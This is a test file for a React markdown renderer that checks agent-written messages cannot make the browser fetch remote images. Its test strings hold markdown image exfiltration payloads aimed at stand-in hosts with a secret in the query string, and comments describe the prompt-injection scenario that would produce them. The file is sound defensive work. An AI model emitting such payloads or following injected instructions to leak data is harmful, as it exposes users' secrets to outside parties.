/**
 * The renderer, held to the one thing a message athanor wrote must never be able to do: make this
 * browser issue a request to somewhere else without anybody clicking anything.
 *
 * `renderToStaticMarkup` is the right instrument for it. It costs no dependency and no DOM, effects
 * do not run so nothing is fetched by the test itself, and what comes back is the markup a reader
 * would actually be served — which is where the `<img src>` either is or is not.
 */
import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import MarkdownBody from './MarkdownBody.js';

const render = (markdown: string): string =>
  renderToStaticMarkup(<MarkdownBody>{markdown}</MarkdownBody>);

describe('an agent-authored message', () => {
  it('cannot make the browser fetch a remote image', () => {
    // The whole attack, written the way an injected page would ask for it: the answer looks normal
    // and the last line hands the stolen text to elsewhere.example on render.
    const html = render(
      'Here is the summary you asked for.\n\n![](https://elsewhere.example/p.png?d=BASE64SECRET)'
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('src=');
    // What the owner gets instead names the host, and is a link they may follow on purpose.
    expect(html).toContain('elsewhere.example');
    expect(html).toContain('blocked-resource');
    expect(html).toContain('Image not loaded');
  });

  it('says at the foot of the message that it asked for something it did not get', () => {
    // The inline mark sits where the image was, which for an exfiltration attempt is the last line
    // of a long answer. What has to survive a skim is that this message tried to talk to somebody.
    const html = render(
      `${'A long answer.\n\n'.repeat(20)}![](https://tracker.example/p.png?d=BASE64SECRET)`
    );
    expect(html).toContain('blocked-resource-summary');
    expect(html).toContain('athanor did not fetch what this message asked for');
    expect(html).toContain('1 address on tracker.example');
  });

  it('adds no such line to an ordinary answer', () => {
    const html = render('Here is the summary.\n\n![A chart](/v1/artifacts/abc/content)');
    expect(html).not.toContain('blocked-resource-summary');
  });

  it('cannot smuggle one past by writing the address unusually', () => {
    for (const address of [
      '//elsewhere.example/p.png',
      'HTTPS://ELSEWHERE.EXAMPLE/p.png',
      'https://elsewhere.example:8443/p.png'
    ]) {
      const html = render(`![](${address})`);
      expect(html, address).not.toContain('<img');
    }
  });

  it('still shows what it meant to show', () => {
    const html = render('![Revenue by quarter](https://elsewhere.example/chart.png)');
    expect(html).toContain('Revenue by quarter');
  });

  it('renders this box&apos;s own artifacts exactly as before', () => {
    const html = render('![A chart](/v1/artifacts/abc/content)');
    expect(html).toContain('<img');
    expect(html).toContain('src="/v1/artifacts/abc/content"');
    expect(html).toContain('alt="A chart"');
    expect(html).toContain('loading="lazy"');
  });

  it('makes no request for a data payload either, because react-markdown drops it first', () => {
    // The policy permits `data:` — it carries its own bytes and reaches no network — but
    // react-markdown's own `defaultUrlTransform` strips it from markdown before any component sees
    // it. Nothing is lost: the allowance is what lets the transcript render the agent's own
    // screenshots, which this client emits directly rather than through markdown.
    const html = render('![](data:image/png;base64,iVBORw0KGgo=)');
    expect(html).not.toContain('<img');
  });

  it('keeps links to elsewhere, because leaving on purpose is not exfiltration', () => {
    const html = render('See [the source](https://elsewhere.example/article).');
    expect(html).toContain('href="https://elsewhere.example/article"');
    expect(html).toContain('rel="noreferrer noopener"');
    expect(html.toLowerCase()).toContain('referrerpolicy="no-referrer"');
  });

  it('does not put react-markdown&apos;s own node object on the element', () => {
    // It was rendering `node="[object Object]"` onto every image and link in the transcript.
    expect(render('![A chart](/v1/artifacts/abc/content)')).not.toContain('node=');
    expect(render('[a link](/somewhere)')).not.toContain('node=');
  });

  it('leaves ordinary prose, code and tables alone', () => {
    const html = render('# Title\n\n`inline`\n\n| a | b |\n| - | - |\n| 1 | 2 |\n');
    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('<code>inline</code>');
    expect(html).toContain('table-scroll');
  });
});

/**
 * The reading column is two measures: prose clamps to 33rem and evidence is let out to the full
 * width, and `styles.css` spends that exemption on a list of selectors — `.markdown > :is(pre,
 * .code-block, .table-scroll, .katex-display)`. The list is only right for as long as those are the
 * elements this renderer actually puts directly under `.markdown`. If a wrapper is renamed or
 * dropped here, nothing breaks loudly: code and tables quietly shrink back inside the prose measure
 * and stay there. So the wrapping is asserted where it is decided.
 */
describe('what the renderer puts directly under .markdown', () => {
  const topLevel = (markdown: string): string[] => {
    const body = render(markdown).replace(/^<div class="markdown">/, '');
    const names: string[] = [];
    let depth = 0;
    for (const [, slash, tag, attrs, selfShut] of body.matchAll(
      /<(\/?)([a-zA-Z][a-zA-Z0-9]*)([^>]*?)(\/?)>/g
    )) {
      if (slash === '/') {
        depth -= 1;
        continue;
      }
      const shut = selfShut === '/' || ['img', 'hr', 'br', 'input'].includes(tag ?? '');
      const first = /class="([^" ]*)/.exec(attrs ?? '')?.[1];
      if (depth === 0) names.push(first ? `${tag}.${first}` : `${tag}`);
      if (!shut) depth += 1;
    }
    return names;
  };

  it('wraps a fenced block and a table, so neither pre nor table is ever a direct child', () => {
    const kids = topLevel(
      'Prose.\n\n```ts\nconst x = 1;\n```\n\n| a | b |\n| - | - |\n| 1 | 2 |\n'
    );
    expect(kids).toContain('figure.code-block');
    expect(kids).toContain('div.table-scroll');
    expect(kids).not.toContain('pre');
    expect(kids).not.toContain('table');
  });

  /*
   * The other list of selectors spent on this renderer's output, and the one that fails quietly.
   * While an answer is arriving `.cooling .markdown` paints its text from one gradient, and the
   * elements that carry ink or a background of their own are named individually so they are taken
   * back off it - `styles.css`, `.cooling .markdown :is(pre, code, table, th, td, a, img, .katex)`.
   * If the renderer stops emitting one of these tags the rule stops matching it, and what a reader
   * sees is a half-arrived answer with a hole in it where its code or its table was.
   */
  it('emits the tags the cooling gradient has to hand back their own ink', () => {
    const html = render(
      'Prose with `inline` code.\n\n```ts\nconst x = 1;\n```\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\n[a link](/somewhere) and ![a chart](/v1/artifacts/abc/content)\n'
    );
    for (const tag of ['<pre', '<code', '<table', '<th', '<td', '<a ', '<img'])
      expect(html, tag).toContain(tag);
  });

  it('leaves prose, headings and lists bare, which is what takes the reading measure', () => {
    expect(topLevel('# Title\n\nProse.\n\n- one\n- two\n\n> quoted\n\n---\n')).toEqual([
      'h1',
      'p',
      'ul',
      'blockquote',
      'hr'
    ]);
  });
});
